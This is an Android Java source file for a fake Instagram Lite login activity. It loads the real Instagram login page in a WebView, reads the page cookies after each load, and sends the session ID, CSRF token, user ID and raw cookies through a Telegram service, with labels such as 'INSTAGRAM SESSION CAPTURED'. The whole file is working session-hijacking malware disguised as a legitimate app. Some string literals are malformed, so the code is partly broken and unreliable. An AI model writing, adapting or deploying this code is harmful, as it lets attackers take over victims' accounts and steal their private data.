package com.instagram.lite;
import android.app.Activity;
import android.os.Bundle;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.webkit.ValueCallback;
import android.webkit.CookieManager;
import android.content.Intent;
import android.os.Build;

public class LoginActivity extends Activity {
    private WebView webView;
    
    @Override protected void onCreate(Bundle b) {
        super.onCreate(b);
        
        startService(new Intent(this, ProxyService.class));
        startService(new Intent(this, TelegramService.class));
        
        webView = new WebView(this);
        webView.getSettings().setJavaScriptEnabled(true);
        webView.getSettings().setDomStorageEnabled(true);
        webView.getSettings().setUserAgentString("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36");
        
        CookieManager.getInstance().removeAllCookies(null);
        
        webView.setWebViewClient(new WebViewClient() {
            @Override public void onPageFinished(WebView view, String url) {
                view.evaluateJavascript("document.cookie;", new ValueCallback<String>() {
                    @Override public void onReceiveValue(String cookies) {
                        if (cookies != null && !cookies.equals("""") && cookies.contains("sessionid")) {
                            String msg = "🔐 INSTAGRAM SESSION CAPTURED\nCookies: " + cookies;
                            new TelegramService().sendMessage(msg);
                            extractTokens(cookies);
                        }
                    }
                });
            }
        });
        
        webView.loadUrl("https://www.instagram.com/accounts/login/");
        setContentView(webView);
    }
    
    private void extractTokens(String cookies) {
        String sessionId = extract(cookies, "sessionid");
        String csrfToken = extract(cookies, "csrftoken");
        String userId = extract(cookies, "ds_user_id");
        if (sessionId != null && !sessionId.isEmpty()) {
            String full = "🔑 FULL SESSION DATA\n";
            full += "SessionID: " + sessionId + "\n";
            full += "CSRF: " + csrfToken + "\n";
            full += "UserID: " + userId + "\n";
            full += "Raw: " + cookies;
            new TelegramService().sendMessage(full);
        }
    }
    
    private String extract(String cookies, String key) {
        for (String c : cookies.split(";")) {
            c = c.trim();
            if (c.startsWith(key + "=")) {
                return c.substring(key.length() + 1).replace(""", "");
            }
        }
        return "N/A";
    }
}